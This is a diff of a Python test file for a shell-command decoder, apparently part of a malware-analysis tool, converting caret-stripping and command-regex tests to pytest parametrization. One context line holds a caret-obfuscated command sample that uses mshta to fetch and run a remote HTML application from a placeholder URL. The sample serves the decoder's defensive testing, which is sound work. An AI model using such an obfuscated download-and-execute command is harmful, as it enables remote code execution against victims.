@@ -1,3 +1,4 @@
+import pytest
 import regex as re
 from multidecoder.decoders.shell import (
     CMD_RE,
@@ -13,24 +14,28 @@ test = b"SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)"
 
 
 # CMD_RE
-def test_cmd_re_empty():
-    assert not re.search(CMD_RE, b"")
+@pytest.mark.parametrize(
+    "data",
+    [
+        b"",
+        b"CmDF",
+    ],
+)
+def test_cmd_re_not_match(data: bytes):
+    assert not re.search(CMD_RE, data)
 
 
-def test_cmd_re_command():
-    assert re.match(CMD_RE, b"cmd arguments")
-
-
-def test_cmd_re_mixed_case():
-    assert re.match(CMD_RE, b"CmD ArgUmenTs")
-
-
-def test_cmd_re_carets():
-    assert re.match(CMD_RE, b"c^m^d c^omman^d")
-
-
-def test_cmd_re_quotes():
-    assert re.match(CMD_RE, b'cmd /c ""echo bee""')
+@pytest.mark.parametrize(
+    "data",
+    [
+        b"cmd arguments",
+        b"CmD ArgUmenTs",
+        b"c^m^d c^omman^d",
+        b'cmd /c ""echo bee""',
+    ],
+)
+def test_cmd_re_match(data: bytes):
+    assert re.match(CMD_RE, data)
 
 
 def test_cmd_re_null():
@@ -46,36 +51,21 @@ def test_cmd_re_ex1():
 
 
 # strip_carets
-def test_strip_carets_empty():
-    assert strip_carets(b"") == b""
-
-
-def test_strip_carets_no_caret():
-    assert strip_carets(b"test") == b"test"
-
-
-def test_strip_carets_caret():
-    assert strip_carets(b"^") == b""
-
-
-def test_strip_carets_escape_caret():
-    assert strip_carets(b"^^") == b"^"
-
-
-def test_strip_carets_trailing_caret():
-    assert strip_carets(b"test^") == b"test"
-
-
-def test_strip_carets_in_strnig():
-    assert strip_carets(b'"^"') == b'"^"'
-
-
-def test_strip_carets_line_continuation():
-    assert strip_carets(b"start^\r\nend") == b"startend"
-
-
-def test_strip_carets_unclosed_string():
-    assert strip_carets(b'"test"" ^') == b'"test"" ^'
+@pytest.mark.parametrize(
+    ("data", "expected"),
+    [
+        (b"", b""),
+        (b"test", b"test"),
+        (b"^", b""),
+        (b"^^", b"^"),
+        (b"test^", b"test"),
+        (b'"^"', b'"^"'),
+        (b"start^\r\nend", b"startend"),
+        (b'"test"" ^', b'"test"" ^'),
+    ],
+)
+def test_strip_carets(data: bytes, expected: bytes):
+    assert strip_carets(data) == expected
 
 
 # find_cmd_strings
